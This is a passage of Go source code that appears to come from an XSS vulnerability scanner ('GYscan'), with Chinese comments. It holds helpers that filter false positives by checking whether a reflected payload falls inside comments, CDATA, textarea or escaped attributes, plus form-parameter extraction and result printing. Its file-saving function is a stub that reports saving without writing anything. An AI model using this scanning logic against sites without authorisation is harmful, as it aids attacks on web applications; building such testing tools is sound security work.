	lastCommentStart := strings.LastIndex(preResponse, "<!--")
	if lastCommentStart == -1 {
		return false
	}

	// 检查在注释开始和payload之间是否有注释结束标记
	between := preResponse[lastCommentStart:]
	if !strings.Contains(between, "-->") {
		// payload在注释中
		return true
	}

	return false
}

// isInCDATA 检查是否在CDATA块中
func isInCDATA(response, payload string) bool {
	payloadIndex := strings.Index(response, payload)
	if payloadIndex == -1 {
		return false
	}

	// 检查前面是否有CDATA开始标记
	preResponse := response[:payloadIndex]
	lastCDATAStart := strings.LastIndex(preResponse, "<![CDATA[")
	if lastCDATAStart == -1 {
		return false
	}

	// 检查在CDATA开始和payload之间是否有CDATA结束标记
	between := preResponse[lastCDATAStart:]
	if !strings.Contains(between, "]]>") {
		// payload在CDATA中
		return true
	}

	return false
}

// isInNonExecutableContext 检查是否在不可执行的上下文中
func isInNonExecutableContext(response, payload string) bool {
	// 检查是否在textarea标签内
	if isBetweenTags(response, payload, "<textarea", "</textarea>") {
		return true
	}

	// 检查是否在pre标签内
	if isBetweenTags(response, payload, "<pre", "</pre>") {
		return true
	}

	// 检查是否在code标签内
	if isBetweenTags(response, payload, "<code", "</code>") {
		return true
	}

	return false
}

// isBetweenTags 检查payload是否在指定标签之间
func isBetweenTags(response, payload, startTag, endTag string) bool {
	payloadIndex := strings.Index(response, payload)
	if payloadIndex == -1 {
		return false
	}

	// 检查前面是否有开始标签
	preResponse := response[:payloadIndex]
	lastStartTag := strings.LastIndex(preResponse, startTag)
	if lastStartTag == -1 {
		return false
	}

	// 检查在开始标签和payload之间是否有结束标签
	between := preResponse[lastStartTag:]
	if !strings.Contains(between, endTag) {
		// payload在标签对中
		return true
	}

	return false
}

// hasInvalidSyntax 检查payload是否有无效的语法
func hasInvalidSyntax(payload string) bool {
	// 检查不完整的标签
	if strings.Count(payload, "<") > strings.Count(payload, ">" ) {
		return true
	}

	// 检查不完整的字符串
	if (strings.Count(payload, "'") % 2 != 0) || (strings.Count(payload, "\"") % 2 != 0) {
		return true
	}

	// 检查无效的事件处理程序格式
	eventPattern := regexp.MustCompile(`on[a-z]+\s*=`)
	if eventPattern.MatchString(payload) && !strings.Contains(payload, "=alert") && !strings.Contains(payload, "=javascript:") {
		return true
	}

	return false
}

// isInEscapedAttribute 检查是否在被正确转义的属性中
func isInEscapedAttribute(response, payload string) bool {
	// 查找payload的位置
	payloadIndex := strings.Index(response, payload)
	if payloadIndex == -1 {
		return false
	}

	// 向前查找等号和属性名
	preResponse := response[:payloadIndex]
	equalIndex := strings.LastIndex(preResponse, "=")
	if equalIndex == -1 {
		return false
	}

	// 检查等号后是否有引号
	afterEqual := preResponse[equalIndex:]
	if strings.Contains(afterEqual, "'") || strings.Contains(afterEqual, "\"") {
		// 检查属性名
		spaceIndex := strings.LastIndex(preResponse[:equalIndex], " ")
		if spaceIndex != -1 {
			attrName := strings.TrimSpace(preResponse[spaceIndex:equalIndex])
			// 检查是否为不会执行脚本的属性
			safeAttributes := []string{"title", "alt", "placeholder", "value", "name", "id", "class"}
			for _, attr := range safeAttributes {
				if strings.EqualFold(attrName, attr) {
					return true
				}
			}
		}
	}

	return false
}

// isFormURL 检查URL是否包含表单
func isFormURL(url string, client *resty.Client) bool {
	resp, err := client.R().Get(url)
	if err != nil {
		return false
	}
	return strings.Contains(strings.ToLower(resp.String()), "<form")
}

// extractFormParams 提取表单参数
func extractFormParams(url string, client *resty.Client) []string {
	var params []string

	resp, err := client.R().Get(url)
	if err != nil {
		return params
	}

	doc, err := goquery.NewDocumentFromReader(strings.NewReader(resp.String()))
	if err != nil {
		return params
	}

	// 提取所有输入字段
	doc.Find("input, textarea, select").Each(func(i int, s *goquery.Selection) {
		name, exists := s.Attr("name")
		if exists && name != "" {
			params = append(params, name)
		}
	})

	return params
}

// extractPathParams 提取路径参数
func extractPathParams(path string) []string {
	var params []string

	// 匹配形如 /user/{id} 或 /user/:id 的路径参数
	parts := strings.Split(path, "/")
	for _, part := range parts {
		if strings.HasPrefix(part, "{") && strings.HasSuffix(part, "}") {
			// 提取 {id} 形式的参数
			paramName := strings.TrimSuffix(strings.TrimPrefix(part, "{"), "}")
			if paramName != "" {
				params = append(params, paramName)
			}
		} else if strings.HasPrefix(part, ":") {
			// 提取 :id 形式的参数
			paramName := strings.TrimPrefix(part, ":")
			if paramName != "" {
				params = append(params, paramName)
			}
		}
	}

	return params
}

// PrintXssResults 打印XSS检测结果
func PrintXssResults(results XssResults) {
	fmt.Printf("[GYscan-XSS] 检测完成\n")
	fmt.Printf("[GYscan-XSS] 检测URL数: %d\n", results.Summary.TotalURLs)
	fmt.Printf("[GYscan-XSS] 检测参数数: %d\n", results.Summary.TotalParams)
	fmt.Printf("[GYscan-XSS] 发现漏洞数: %d\n", results.Summary.Vulnerable)
	fmt.Printf("[GYscan-XSS] 反射型XSS: %d\n", results.Summary.Reflected)
	fmt.Printf("[GYscan-XSS] 存储型XSS: %d\n", results.Summary.Stored)
	fmt.Printf("[GYscan-XSS] DOM型XSS: %d\n", results.Summary.DOM)
	fmt.Printf("[GYscan-XSS] 检测耗时: %.2f秒\n", results.Summary.DetectionTime)

	if len(results.Results) > 0 {
		fmt.Println("\n[GYscan-XSS] 漏洞详情:")
		for i, result := range results.Results {
			fmt.Printf("\n漏洞 #%d:\n", i+1)
			fmt.Printf("  URL: %s\n", result.URL)
			fmt.Printf("  参数: %s\n", result.Param)
			fmt.Printf("  类型: %s\n", result.Type)
			fmt.Printf("  位置: %s\n", result.Location)
			fmt.Printf("  Payload: %s\n", result.Payload)
			fmt.Printf("  状态码: %d\n", result.StatusCode)
			fmt.Printf("  证据: %s\n", result.Evidence)
		}
	}
}

// SaveXssResults 保存XSS检测结果到文件
func SaveXssResults(results XssResults, filename string) error {
	// 简单实现，后续扩展
	fmt.Printf("[GYscan-XSS] 保存结果到文件: %s\n", filename)
	return nil
}
